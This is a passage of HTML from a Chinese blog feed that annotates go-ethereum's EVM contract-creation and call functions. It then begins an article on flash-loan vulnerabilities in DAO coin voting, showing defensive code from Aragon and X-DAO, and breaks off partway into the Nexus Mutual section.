class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create creates a new contract using code as deployment code.</span></span><br><span class="line">func (evm *EVM) create(caller ContractRef, codeAndHash *codeAndHash, gas uint64, value *big.Int, address common.Address, typ OpCode) ([]byte, common.Address, uint64, error) &#123;</span><br><span class="line"><span class="comment">// Depth check execution. Fail if we're trying to execute above the</span></span><br><span class="line"><span class="comment">// limit.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 首先检测当前evm执行的深度 默认不应该超过1024</span></span><br><span class="line"><span class="keyword">if</span> evm.depth &gt; int(params.CallCreateDepth) &#123;</span><br><span class="line"><span class="keyword">return</span> nil, common.Address&#123;&#125;, gas, ErrDepth</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这个函数我们不在追踪 其功能就是检测是否调用方的金额大约value</span></span><br><span class="line"><span class="keyword">if</span> !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) &#123;</span><br><span class="line"><span class="keyword">return</span> nil, common.Address&#123;&#125;, gas, ErrInsufficientBalance</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 首先获取调用者的nonce 然后再更新调用者的nonce  这个如果熟悉以太坊交易流程的话应该知道nonce的作用。</span></span><br><span class="line">nonce := evm.StateDB.GetNonce(caller.Address())</span><br><span class="line"><span class="keyword">if</span> nonce+<span class="number">1</span> &lt; nonce &#123;</span><br><span class="line"><span class="keyword">return</span> nil, common.Address&#123;&#125;, gas, ErrNonceUintOverflow</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 首先获取调用者的nonce 然后再更新调用者的nonce  这个如果熟悉以太坊交易流程的话应该知道nonce的作用。</span></span><br><span class="line">evm.StateDB.SetNonce(caller.Address(), nonce+<span class="number">1</span>)</span><br><span class="line"><span class="comment">// We add this to the access list _before_ taking a snapshot. Even if the creation fails,</span></span><br><span class="line"><span class="comment">// the access-list change should not be rolled back</span></span><br><span class="line"><span class="keyword">if</span> evm.chainRules.IsBerlin &#123;</span><br><span class="line">evm.StateDB.AddAddressToAccessList(address)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Ensure there's no existing contract already at the designated address</span></span><br><span class="line">contractHash := evm.StateDB.GetCodeHash(address)</span><br><span class="line"><span class="keyword">if</span> evm.StateDB.GetNonce(address) != <span class="number">0</span> || (contractHash != (common.Hash&#123;&#125;) &amp;&amp; contractHash != emptyCodeHash) &#123;</span><br><span class="line"><span class="keyword">return</span> nil, common.Address&#123;&#125;, <span class="number">0</span>, ErrContractAddressCollision</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Create a new account on the state</span></span><br><span class="line"><span class="comment">// 既然已经创建好了合约地址 那么就要为这个合约地址创建账户体系</span></span><br><span class="line">snapshot := evm.StateDB.Snapshot()</span><br><span class="line">evm.StateDB.CreateAccount(address)</span><br><span class="line"><span class="keyword">if</span> evm.chainRules.IsEIP158 &#123;</span><br><span class="line">evm.StateDB.SetNonce(address, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">evm.Context.Transfer(evm.StateDB, caller.Address(), address, value)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialise a new contract and set the code that is to be used by the EVM.</span></span><br><span class="line"><span class="comment">// The contract is a scoped environment for this execution context only.</span></span><br><span class="line">contract := NewContract(caller, AccountRef(address), value, gas)</span><br><span class="line">contract.SetCodeOptionalHash(&amp;address, codeAndHash)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> evm.Config.Debug &#123;</span><br><span class="line"><span class="keyword">if</span> evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">evm.Config.Tracer.CaptureStart(evm, caller.Address(), address, <span class="literal">true</span>, codeAndHash.code, gas, value)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">evm.Config.Tracer.CaptureEnter(typ, caller.Address(), address, codeAndHash.code, gas, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// // 将evm对象 合约对象传入run函数开始执行 此函数是核心 等一会分析到Call入口的时候最终也会调用此函数</span></span><br><span class="line">ret, err = run(evm, contract, nil)</span><br><span class="line">ret, <span class="attr">err</span> := evm.interpreter.Run(contract, nil, <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check whether the max code size has been exceeded, assign err if the case.</span></span><br><span class="line"><span class="keyword">if</span> err == nil &amp;&amp; evm.chainRules.IsEIP158 &amp;&amp; len(ret) &gt; params.MaxCodeSize &#123;</span><br><span class="line">err = ErrMaxCodeSizeExceeded</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reject code starting with 0xEF if EIP-3541 is enabled.</span></span><br><span class="line"><span class="keyword">if</span> err == nil &amp;&amp; len(ret) &gt;= <span class="number">1</span> &amp;&amp; ret[<span class="number">0</span>] == <span class="number">0xEF</span> &amp;&amp; evm.chainRules.IsLondon &#123;</span><br><span class="line">err = ErrInvalidCode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if the contract creation ran successfully and no errors were returned</span></span><br><span class="line"><span class="comment">// calculate the gas required to store the code. If the code could not</span></span><br><span class="line"><span class="comment">// be stored due to not enough gas set an error and let it be handled</span></span><br><span class="line"><span class="comment">// by the error checking condition below.</span></span><br><span class="line"><span class="keyword">if</span> err == nil &#123;</span><br><span class="line">createDataGas := uint64(len(ret)) * params.CreateDataGas</span><br><span class="line"><span class="keyword">if</span> contract.UseGas(createDataGas) &#123;</span><br><span class="line">evm.StateDB.SetCode(address, ret)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">err = ErrCodeStoreOutOfGas</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// When an error was returned by the EVM or when setting the creation code</span></span><br><span class="line"><span class="comment">// above we revert to the snapshot and consume any gas remaining. Additionally</span></span><br><span class="line"><span class="comment">// when we're in homestead this also counts for code storage gas errors.</span></span><br><span class="line"><span class="keyword">if</span> err != nil &amp;&amp; (evm.chainRules.IsHomestead || err != ErrCodeStoreOutOfGas) &#123;</span><br><span class="line">evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line"><span class="keyword">if</span> err != ErrExecutionReverted &#123;</span><br><span class="line">contract.UseGas(contract.Gas)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> evm.Config.Debug &#123;</span><br><span class="line"><span class="keyword">if</span> evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">evm.Config.Tracer.CaptureEnd(ret, gas-contract.Gas, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">evm.Config.Tracer.CaptureExit(ret, gas-contract.Gas, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret, address, contract.Gas, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create creates a new contract using code as deployment code.</span></span><br><span class="line">func (evm *EVM) Create(caller ContractRef, code []byte, gas uint64, value *big.Int) (ret []byte, contractAddr common.Address, leftOverGas uint64, err error) &#123;</span><br><span class="line">contractAddr = crypto.CreateAddress(caller.Address(), evm.StateDB.GetNonce(caller.Address()))</span><br><span class="line"><span class="keyword">return</span> evm.create(caller, &amp;codeAndHash&#123;<span class="attr">code</span>: code&#125;, gas, value, contractAddr, CREATE)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Call方法, 无论我们转账或者是执行合约代码都会调用到这里， 同时合约里面的call指令也会执行到这里。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Call executes the contract associated with the addr with the given input as</span></span><br><span class="line"><span class="comment">// parameters. It also handles any necessary value transfer required and takes</span></span><br><span class="line"><span class="comment">// the necessary steps to create accounts and reverses the state in case of an</span></span><br><span class="line"><span class="comment">// execution error or failed value transfer.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Call 执行与给定的input作为参数与addr相关联的合约。 </span></span><br><span class="line"><span class="comment">// 它还处理所需的任何必要的转账操作，并采取必要的步骤来创建帐户</span></span><br><span class="line"><span class="comment">// 并在任意错误的情况下回滚所做的操作。</span></span><br><span class="line"></span><br><span class="line">func (evm *EVM) Call(caller ContractRef, addr common.Address, input []byte, gas uint64, value *big.Int) (ret []byte, leftOverGas uint64, err error) &#123;</span><br><span class="line">    <span class="keyword">if</span> evm.vmConfig.NoRecursion &amp;&amp; evm.depth &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, nil</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fail if we're trying to execute above the call depth limit</span></span><br><span class="line">    <span class="comment">//  调用深度最多1024</span></span><br><span class="line">    <span class="keyword">if</span> evm.depth &gt; int(params.CallCreateDepth) &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, ErrDepth</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Fail if we're trying to transfer more than the available balance</span></span><br><span class="line">    <span class="comment">// 查看我们的账户是否有足够的金钱。</span></span><br><span class="line">    <span class="keyword">if</span> !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, ErrInsufficientBalance</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        to       = AccountRef(addr)</span><br><span class="line">        snapshot = evm.StateDB.Snapshot()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> !evm.StateDB.Exist(addr) &#123; <span class="comment">// 查看指定地址是否存在</span></span><br><span class="line">        <span class="comment">// 如果地址不存在，查看是否是 native go的合约， native go的合约在</span></span><br><span class="line">        <span class="comment">// contracts.go 文件里面</span></span><br><span class="line">        precompiles := PrecompiledContractsHomestead</span><br><span class="line">        <span class="keyword">if</span> evm.ChainConfig().IsByzantium(evm.BlockNumber) &#123;</span><br><span class="line">            precompiles = PrecompiledContractsByzantium</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> precompiles[addr] == nil &amp;&amp; evm.ChainConfig().IsEIP158(evm.BlockNumber) &amp;&amp; value.Sign() == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="comment">// 如果不是指定的合约地址， 并且value的值为0那么返回正常，而且这次调用没有消耗Gas</span></span><br><span class="line">            <span class="keyword">return</span> nil, gas, nil</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 负责在本地状态创建addr</span></span><br><span class="line">        evm.StateDB.CreateAccount(addr)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 执行转账</span></span><br><span class="line">    evm.Transfer(evm.StateDB, caller.Address(), to.Address(), value)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialise a new contract and set the code that is to be used by the</span></span><br><span class="line">    <span class="comment">// E The contract is a scoped environment for this execution context</span></span><br><span class="line">    <span class="comment">// only.</span></span><br><span class="line">    contract := NewContract(caller, to, value, gas)</span><br><span class="line">    contract.SetCallCode(&amp;addr, evm.StateDB.GetCodeHash(addr), evm.StateDB.GetCode(addr))</span><br><span class="line"></span><br><span class="line">    ret, err = run(evm, snapshot, contract, input)</span><br><span class="line">    <span class="comment">// When an error was returned by the EVM or when setting the creation code</span></span><br><span class="line">    <span class="comment">// above we revert to the snapshot and consume any gas remaining. Additionally</span></span><br><span class="line">    <span class="comment">// when we're in homestead this also counts for code storage gas errors.</span></span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">        <span class="keyword">if</span> err != errExecutionReverted &#123; </span><br><span class="line">            <span class="comment">// 如果是由revert指令触发的错误，因为ICO一般设置了人数限制或者资金限制</span></span><br><span class="line">            <span class="comment">// 在大家抢购的时候很可能会触发这些限制条件，导致被抽走不少钱。这个时候</span></span><br><span class="line">            <span class="comment">// 又不能设置比较低的GasPrice和GasLimit。因为要速度快。</span></span><br><span class="line">            <span class="comment">// 那么不会使用剩下的全部Gas，而是只会使用代码执行的Gas</span></span><br><span class="line">            <span class="comment">// 不然会被抽走 GasLimit *GasPrice的钱，那可不少。</span></span><br><span class="line">            contract.UseGas(contract.Gas)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret, contract.Gas, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>剩下的三个函数 CallCode, DelegateCall, 和 StaticCall，这三个函数不能由外部调用，只能由Opcode触发。</p><p>CallCode</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CallCode differs from Call in the sense that it executes the given address'</span></span><br><span class="line"><span class="comment">// code with the caller as context.</span></span><br><span class="line"><span class="comment">// CallCode与Call不同的地方在于它使用caller的context来执行给定地址的代码。</span></span><br><span class="line"></span><br><span class="line">func (evm *EVM) CallCode(caller ContractRef, addr common.Address, input []byte, gas uint64, value *big.Int) (ret []byte, leftOverGas uint64, err error) &#123;</span><br><span class="line">    <span class="keyword">if</span> evm.vmConfig.NoRecursion &amp;&amp; evm.depth &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, nil</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fail if we're trying to execute above the call depth limit</span></span><br><span class="line">    <span class="keyword">if</span> evm.depth &gt; int(params.CallCreateDepth) &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, ErrDepth</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Fail if we're trying to transfer more than the available balance</span></span><br><span class="line">    <span class="keyword">if</span> !evm.CanTransfer(evm.StateDB, caller.Address(), value) &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, ErrInsufficientBalance</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        snapshot = evm.StateDB.Snapshot()</span><br><span class="line">        to       = AccountRef(caller.Address())  <span class="comment">//这里是最不同的地方 to的地址被修改为caller的地址了 而且没有转账的行为</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// initialise a new contract and set the code that is to be used by the</span></span><br><span class="line">    <span class="comment">// E The contract is a scoped evmironment for this execution context</span></span><br><span class="line">    <span class="comment">// only.</span></span><br><span class="line">    contract := NewContract(caller, to, value, gas)</span><br><span class="line">    contract.SetCallCode(&amp;addr, evm.StateDB.GetCodeHash(addr), evm.StateDB.GetCode(addr))</span><br><span class="line"></span><br><span class="line">    ret, err = run(evm, snapshot, contract, input)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">        <span class="keyword">if</span> err != errExecutionReverted &#123;</span><br><span class="line">            contract.UseGas(contract.Gas)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret, contract.Gas, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DelegateCall</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DelegateCall differs from CallCode in the sense that it executes the given address'</span></span><br><span class="line"><span class="comment">// code with the caller as context and the caller is set to the caller of the caller.</span></span><br><span class="line"><span class="comment">// DelegateCall 和 CallCode不同的地方在于 caller被设置为 caller的caller</span></span><br><span class="line">func (evm *EVM) DelegateCall(caller ContractRef, addr common.Address, input []byte, gas uint64) (ret []byte, leftOverGas uint64, err error) &#123;</span><br><span class="line">    <span class="keyword">if</span> evm.vmConfig.NoRecursion &amp;&amp; evm.depth &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, nil</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Fail if we're trying to execute above the call depth limit</span></span><br><span class="line">    <span class="keyword">if</span> evm.depth &gt; int(params.CallCreateDepth) &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, ErrDepth</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        snapshot = evm.StateDB.Snapshot()</span><br><span class="line">        to       = AccountRef(caller.Address()) </span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialise a new contract and make initialise the delegate values</span></span><br><span class="line">    <span class="comment">// 标识为AsDelete()</span></span><br><span class="line">    contract := NewContract(caller, to, nil, gas).AsDelegate() </span><br><span class="line">    contract.SetCallCode(&amp;addr, evm.StateDB.GetCodeHash(addr), evm.StateDB.GetCode(addr))</span><br><span class="line"></span><br><span class="line">    ret, err = run(evm, snapshot, contract, input)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">        <span class="keyword">if</span> err != errExecutionReverted &#123;</span><br><span class="line">            contract.UseGas(contract.Gas)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret, contract.Gas, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// StaticCall executes the contract associated with the addr with the given input</span></span><br><span class="line"><span class="comment">// as parameters while disallowing any modifications to the state during the call.</span></span><br><span class="line"><span class="comment">// Opcodes that attempt to perform such modifications will result in exceptions</span></span><br><span class="line"><span class="comment">// instead of performing the modifications.</span></span><br><span class="line"><span class="comment">// StaticCall不允许执行任何修改状态的操作，</span></span><br><span class="line"></span><br><span class="line">func (evm *EVM) StaticCall(caller ContractRef, addr common.Address, input []byte, gas uint64) (ret []byte, leftOverGas uint64, err error) &#123;</span><br><span class="line">    <span class="keyword">if</span> evm.vmConfig.NoRecursion &amp;&amp; evm.depth &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, nil</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Fail if we're trying to execute above the call depth limit</span></span><br><span class="line">    <span class="keyword">if</span> evm.depth &gt; int(params.CallCreateDepth) &#123;</span><br><span class="line">        <span class="keyword">return</span> nil, gas, ErrDepth</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Make sure the readonly is only set if we aren't in readonly yet</span></span><br><span class="line">    <span class="comment">// this makes also sure that the readonly flag isn't removed for</span></span><br><span class="line">    <span class="comment">// child calls.</span></span><br><span class="line">    <span class="keyword">if</span> !evm.interpreter.readOnly &#123;</span><br><span class="line">        evm.interpreter.readOnly = <span class="literal">true</span></span><br><span class="line">        defer func() &#123; evm.interpreter.readOnly = <span class="literal">false</span> &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        to       = AccountRef(addr)</span><br><span class="line">        snapshot = evm.StateDB.Snapshot()</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// Initialise a new contract and set the code that is to be used by the</span></span><br><span class="line">    <span class="comment">// EVM. The contract is a scoped environment for this execution context</span></span><br><span class="line">    <span class="comment">// only.</span></span><br><span class="line">    contract := NewContract(caller, to, <span class="keyword">new</span>(big.Int), gas)</span><br><span class="line">    contract.SetCallCode(&amp;addr, evm.StateDB.GetCodeHash(addr), evm.StateDB.GetCode(addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// When an error was returned by the EVM or when setting the creation code</span></span><br><span class="line">    <span class="comment">// above we revert to the snapshot and consume any gas remaining. Additionally</span></span><br><span class="line">    <span class="comment">// when we're in Homestead this also counts for code storage gas errors.</span></span><br><span class="line">    ret, err = run(evm, snapshot, contract, input)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">        <span class="keyword">if</span> err != errExecutionReverted &#123;</span><br><span class="line">            contract.UseGas(contract.Gas)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret, contract.Gas, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> EVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dao投票相关漏洞以及解决方案</title>
      <link href="/Dao-vulnerabilities/"/>
      <url>/Dao-vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h1 id="Dao投票相关漏洞以及解决方案"><a href="#Dao投票相关漏洞以及解决方案" class="headerlink" title="Dao投票相关漏洞以及解决方案"></a>Dao投票相关漏洞以及解决方案</h1><hr><pre><code>author：Thomas_Xu</code></pre><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>去中心化自治组织（DAO）在区块链中运作，由投票管理。 <code>Coin voting</code>是最受欢迎的一种：DAO 的成员提出建议，其他token持有者用代币表示认可。当达到提案的法定人数时，可以执行其脚本。</p><p>有许多DAO使用<code>Coin voting</code>：基于<code>Aragon</code>的DAO，<code>X-DAO</code>，<code>Nexus Mututal</code>，<code>Showball Finance</code>，<code>Pickle Finance</code>，<code>Spirit Swap</code>，<code>Keep3r Network</code>等等。</p><p>在本文中，我们将研究<code>Coin voting</code>中可能出现的技术漏洞，并检查它们是否存在于上述这些 DAO 中。</p><h1 id="闪贷攻击"><a href="#闪贷攻击" class="headerlink" title="闪贷攻击"></a>闪贷攻击</h1><p>如果黑客可以在同一区块中投票并执行提案（例如通过紧急方法），则 DAO 可能容易受到攻击。这些漏洞以前在<a href="https://bean.money/blog/beanstalk-governance-exploit" target="_blank" rel="noopener">Beanstalk</a>和<a href="https://www.theblock.co/post/82721/makerdao-issues-warning-after-a-flash-loan-is-used-to-pass-a-governance-vote" target="_blank" rel="noopener">MakerDAO</a>等项目中遇到过。</p><h2 id="Aragon"><a href="#Aragon" class="headerlink" title="Aragon"></a>Aragon</h2><p>Aragon使用<a href="https://github.com/aragon/minime/blob/1d5251fc88eee5024ff318d95bc9f4c5de130430/contracts/MiniMeToken.sol" target="_blank" rel="noopener">MiniMeToken的</a>balanceOfAt（）在创建提案之前计算用户余额的一个区块。这使得闪贷攻击变得不可能。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询特定_blockNumber处_owner的余额</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">balanceOfAt</span>(<span class="params">address _owner, uint _blockNumber</span>) <span class="title">public</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> ((balances[_owner].length == <span class="number">0</span>) || (balances[_owner][<span class="number">0</span>].fromBlock &gt; _blockNumber)) &#123;</span><br><span class="line">           <span class="keyword">if</span> (address(parentToken) != <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// Has no parent</span></span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 这将在正常情况下返回预期余额</span></span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> getValueAt(balances[_owner], _blockNumber);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="X-DAO"><a href="#X-DAO" class="headerlink" title="X-DAO"></a>X-DAO</h2><p><a href="https://github.com/xdao-app/xdao-contracts/blob/855c2d6aa4016d09ae357abaff945ceb8af82347/contracts/core/Dao.sol#L580" target="_blank" rel="noopener">X-DAO</a> 在转账时时恢revert:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address, uint256</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    revert(<span class="string">"GT: transfer is prohibited"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，不可能借出代币或在DEX中出售代币以及借入或购买，因此闪电贷款攻击是不可能的。</p><h2 id="Nexus-Mutual"><a href="#Nexus-Mutual" class="headerlink" title="Nexus Mutual"></a>Nexus Mutual</h2><p>Nexus Mutual中的提案分为只有顾问委员会才能投票的提案和普通成员可以投票的提案。在咨询委员会投票中，每个参与者的权重等于一个。成员投票是普通的<code>Coin voting</code>。我们的范围只是<code>Coin voting</code>。</p><p>如果所有其他成员都已投票<a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/governance/Governance.sol#L711" target="_blank" rel="noopener">[→]</a>，则可以在一次交易中投票并执行提案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 